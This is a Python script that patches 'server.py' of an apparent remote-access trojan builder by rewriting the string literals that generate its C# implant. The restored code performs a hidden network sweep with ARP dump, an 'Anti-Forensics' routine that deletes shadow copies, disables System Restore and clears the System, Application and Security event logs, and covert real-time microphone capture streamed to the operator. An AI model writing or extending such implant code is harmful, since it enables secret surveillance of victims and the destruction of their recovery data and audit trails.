import sys

with open('c:/Users/danya/Downloads/baron-main/server.py', 'r', encoding='utf-8') as f:
    text = f.read()

# Instead of relying on manual matching, we'll write the exact missing block back, properly escaped as Python code.

# This string is exactly what Python will output
replacement = """                            if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) {
                                string hostname = "";
                                try { hostname = System.Net.Dns.GetHostEntry(pip).HostName; } catch {}
                                found.Add(string.Format("{0,-16} {1,-30} {2}ms",
                                    pip, hostname, reply.RoundtripTime));
                            }
                        } catch {}
                    });
                    t.IsBackground = true;
                    t.Start(target);
                    tasks.Add(t);
                    if (tasks.Count >= 50) {
                        foreach (var tt in tasks) tt.Join(2000);
                        tasks.Clear();
                    }
                }
                foreach (var tt in tasks) tt.Join(2000);
                sb.AppendLine(string.Format("Found {0} hosts:\\n", found.Count));
                foreach (var h in found.OrderBy(x => x)) {
                    sb.AppendLine(h);
                }
                // ARP table
                sb.AppendLine("\\n=== ARP Table ===");
                try {
                    var arp = new ProcessStartInfo {
                        FileName = "arp",
                        Arguments = "-a",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    var p = Process.Start(arp);
                    sb.AppendLine(p.StandardOutput.ReadToEnd());
                    p.WaitForExit(5000);
                } catch {}
            } catch (Exception ex) {
                sb.AppendLine("Error: " + ex.Message);
            }
            return sb.ToString();
        }
    )

def _generate_sys_restore_kill_code():
    return (
        "        // ==== Anti-Forensics ====\\n"
        "        static string KillSystemRestore() {\\n"
        "            var sb = new StringBuilder();\\n"
        "            try {\\n"
        "                var psi = new ProcessStartInfo {\\n"
        '                    FileName = "vssadmin.exe",\\n'
        '                    Arguments = "delete shadows /all /quiet",\\n'
        "                    WindowStyle = ProcessWindowStyle.Hidden,\\n"
        "                    CreateNoWindow = true,\\n"
        "                    UseShellExecute = false,\\n"
        "                    RedirectStandardOutput = true\\n"
        "                };\\n"
        "                var p = Process.Start(psi);\\n"
        "                sb.AppendLine(p.StandardOutput.ReadToEnd());\\n"
        "                p.WaitForExit(10000);\\n"
        "                RunHiddenPS(\\\"Disable-ComputerRestore -Drive 'C:\\\\\\\\' -ErrorAction SilentlyContinue\\\");\\n"
        '                sb.AppendLine("System Restore disabled");\\n'
        '                RunHiddenPS("wevtutil cl System; wevtutil cl Application; wevtutil cl Security");\\n'
        '                sb.AppendLine("Event logs cleared");\\n'
        "            } catch (Exception ex) {\\n"
        '                sb.AppendLine("Error: " + ex.Message);\\n'
        "            }\\n"
        "            return sb.ToString();\\n"
        "        }\\n"
    )

def _generate_realtime_audio_code():
    return (
        "        // ==== Real-Time Audio Streaming (Native waveIn) ====\\n"
        "        [DllImport(\\\"winmm.dll\\\")]\\n"
        "        static extern int waveInOpen(out IntPtr hWaveIn, int uDeviceID, ref WAVEFORMATEX lpFormat, waveInProc dwCallback, IntPtr dwInstance, int dwFlags);\\n"
        "        [DllImport(\\\"winmm.dll\\\")]\\n"
        "        static extern int waveInPrepareHeader(IntPtr hWaveIn, IntPtr lpWaveInHdr, int uSize);\\n"
        "        [DllImport(\\\"winmm.dll\\\")]\\n"
        "        static extern int waveInAddBuffer(IntPtr hWaveIn, IntPtr lpWaveInHdr, int uSize);\\n"
        "        [DllImport(\\\"winmm.dll\\\")]\\n"
        "        static extern int waveInStart(IntPtr hWaveIn);\\n"
        "        [DllImport(\\\"winmm.dll\\\")]\\n"
        "        static extern int waveInStop(IntPtr hWaveIn);\\n"
        "        [DllImport(\\\"winmm.dll\\\")]\\n"
        "        static extern int waveInUnprepareHeader(IntPtr hWaveIn, IntPtr lpWaveInHdr, int uSize);\\n"
        "        [DllImport(\\\"winmm.dll\\\")]\\n"
        "        static extern int waveInClose(IntPtr hWaveIn);\\n"
        "\\n"
        "        delegate void waveInProc(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr wavhdr, IntPtr dwParam2);\\n"
        "\\n"
        "        [StructLayout(LayoutKind.Sequential)]\\n"
        "        struct WAVEFORMATEX {\\n"
        "            public short wFormatTag;\\n"
        "            public short nChannels;\\n"
        "            public int nSamplesPerSec;\\n"
        "            public int nAvgBytesPerSec;\\n"
        "            public short nBlockAlign;\\n"
        "            public short wBitsPerSample;\\n"
        "            public short cbSize;\\n"
        "        }\\n"
        "\\n"
        "        [StructLayout(LayoutKind.Sequential)]\\n"
        "        struct WAVEHDR {\\n"
        "            public IntPtr lpData;\\n"
        "            public int dwBufferLength;\\n"
        "            public int dwBytesRecorded;\\n"
        "            public IntPtr dwUser;\\n"
        "            public int dwFlags;\\n"
        "            public int dwLoops;\\n"
        "            public IntPtr lpNext;\\n"
        "            public IntPtr reserved;\\n"
        "        }\\n"
        "\\n"
        "        static waveInProc _waveInCb;\\n"
        "        static IntPtr _hWaveIn;\\n"
        "        static bool rtAudioRunning = false;\\n"
        "\\n"
        "        static void StartRealtimeAudio() {\\n"
        "            if (rtAudioRunning) return;\\n"
        "            rtAudioRunning = true;\\n"
        "\\n"
        "            WAVEFORMATEX fmt = new WAVEFORMATEX();\\n"
        "            fmt.wFormatTag = 1; \\n"
        "            fmt.nChannels = 1;\\n"
        "            fmt.nSamplesPerSec = 16000;\\n"
        "            fmt.wBitsPerSample = 16;\\n"
        "            fmt.nBlockAlign = (short)(fmt.nChannels * fmt.wBitsPerSample / 8);\\n"
        "            fmt.nAvgBytesPerSec = fmt.nSamplesPerSec * fmt.nBlockAlign;\\n"
        "            fmt.cbSize = 0;\\n"
        "\\n"
        "            _waveInCb = new waveInProc(WaveInCallback);\\n"
        "            int res = waveInOpen(out _hWaveIn, -1, ref fmt, _waveInCb, IntPtr.Zero, 0x30000);\\n"
        "            if (res != 0) {\\n"
        "                Res(\\\"audio_error\\\", \\\"RT Audio error: waveInOpen failed \\\" + res);\\n"
        "                rtAudioRunning = false;\\n"
        "                return;\\n"
        "            }\\n"
        "\\n"
        "            for (int i=0; i<3; i++) {\\n"
        "                IntPtr pWaveHdr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WAVEHDR)));\\n"
        "                WAVEHDR hdr = new WAVEHDR();\\n"
        "                hdr.dwBufferLength = fmt.nAvgBytesPerSec / 2;\\n"
        "                hdr.lpData = Marshal.AllocHGlobal(hdr.dwBufferLength);\\n"
        "                Marshal.StructureToPtr(hdr, pWaveHdr, false);\\n"
        "                waveInPrepareHeader(_hWaveIn, pWaveHdr, Marshal.SizeOf(typeof(WAVEHDR)));\\n"
        "                waveInAddBuffer(_hWaveIn, pWaveHdr, Marshal.SizeOf(typeof(WAVEHDR)));\\n"
        "            }\\n"
        "            waveInStart(_hWaveIn);\\n"
        "        }\\n"
        "\\n"
        "        static void WaveInCallback(IntPtr hwi, int uMsg, IntPtr dwInstance, IntPtr wavhdrPtr, IntPtr dwParam2) {\\n"
        "            if (uMsg == 0x3BF && rtAudioRunning) {\\n"
        "                WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(wavhdrPtr, typeof(WAVEHDR));\\n"
        "                if (hdr.dwBytesRecorded > 0) {\\n"
        "                    byte[] pcm = new byte[hdr.dwBytesRecorded];\\n"
        "                    Marshal.Copy(hdr.lpData, pcm, 0, hdr.dwBytesRecorded);\\n"
        "                    WAVEFORMATEX fmt = new WAVEFORMATEX { nChannels=1, nSamplesPerSec=16000, wBitsPerSample=16 };\\n"
        "                    byte[] fullWav = new byte[pcm.Length + 44];\\n"
        "                    byte[] header = CreateWavHeader(fmt, pcm.Length);\\n"
        "                    Buffer.BlockCopy(header, 0, fullWav, 0, 44);\\n"
        "                    Buffer.BlockCopy(pcm, 0, fullWav, 44, pcm.Length);\\n"
        "                    SendAudioChunk(fullWav);\\n"
        "                    waveInAddBuffer(hwi, wavhdrPtr, Marshal.SizeOf(typeof(WAVEHDR)));\\n"
        "                }\\n"
        "            }\\n"
        "        }\\n"
        "\\n"
        "        static void StopRealtimeAudio() {\\n"
        "            rtAudioRunning = false;\\n"
        "            waveInStop(_hWaveIn);\\n"
        "        }\\n"
        "\\n"
        "        static byte[] CreateWavHeader(WAVEFORMATEX fmt, int dataSize) {"""

# We need to format the replacement so they actually form proper Python string literals in the server.py file.
# The `replacement` variable contains the raw string contents that they evaluate to, NOT the actual python source representation!
# But wait... I can just use python's repr()! Or better, `repr(line)`

python_code = []

lines = replacement.split('\n')
for line in lines:
    if line == "    )":
        python_code.append(line)
        continue
    if line.startswith("def _generate_") or line == "    return (":
        python_code.append(line)
        continue
    if line.startswith('        static byte[] CreateWavHeader(WAVEFORMATEX fmt, int dataSize) {'):
        python_code.append('        "        static byte[] CreateWavHeader(WAVEFORMATEX fmt, int dataSize) {\\n"')
        continue

    # It's a C# code line to be emitted by the generator
    # So we want something like: '        "    <line>\\n"'
    if line == "":
        python_code.append('        "\\n"')
    else:
        # replace any double quotes in the line with escaped double quotes
        python_code.append("        \"" + line.replace('"', '\\"') + "\\n\"")

formatted_block = '\n'.join(python_code)

# Let's fix up some of the artifacts of the new string
# We must replace from "if (reply.Status...Success) {" literal (without python string prefix) to the start of CreateWavHeader literal

# The problem is that server.py text starts the broken chunk AT:
# "                            if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) {"

start_idx = text.find('"                            if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) {')

# Find the end idx. The file ends the broken chunk at the python literal "        static byte[] CreateWavHeader"
end_idx = text.find('"        static byte[] CreateWavHeader(WAVEFORMATEX fmt, int dataSize) {')

if start_idx == -1 or end_idx == -1:
    print(f"Could not find indices: {start_idx}, {end_idx}")
    sys.exit(1)

out = text[:start_idx] + formatted_block + text[end_idx + len('"        static byte[] CreateWavHeader(WAVEFORMATEX fmt, int dataSize) {\\n"'):]

with open('c:/Users/danya/Downloads/baron-main/server.py', 'w', encoding='utf-8') as f:
    f.write(out)

print("FIXED")
